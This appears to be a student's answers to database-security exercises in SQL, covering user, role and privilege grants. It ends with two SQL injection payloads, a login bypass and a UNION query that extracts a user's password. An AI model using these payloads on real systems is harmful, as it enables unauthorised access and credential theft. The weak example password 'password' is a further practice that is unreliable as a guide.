-- Exercise 1
CREATE DATABASE user_db;

CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';

CREATE ROLE 'app_role';

GRANT SELECT, INSERT, UPDATE, DELETE ON user_db.* TO 'app_role';

GRANT 'app_role' TO 'app_user'@'localhost';

SET ROLE 'app_role';

SET DEFAULT ROLE 'app_role' TO 'app_user'@'localhost';


-- Exercise 2
CREATE USER 'power_user'@'localhost' IDENTIFIED BY 'password';

GRANT CREATE ON *.* TO 'power_user'@'localhost' WITH GRANT OPTION;

-- Login as power_user
GRANT CREATE ON *.* TO 'app_user'@'localhost';

-- Login as root
REVOKE CREATE ON *.* FROM 'power_user'@'localhost';


-- Exercise 3
-- Login as alice
password = ' OR '1'='1


-- Reveal alice's password
password = ' union select id, password, password from users where username = 'alice
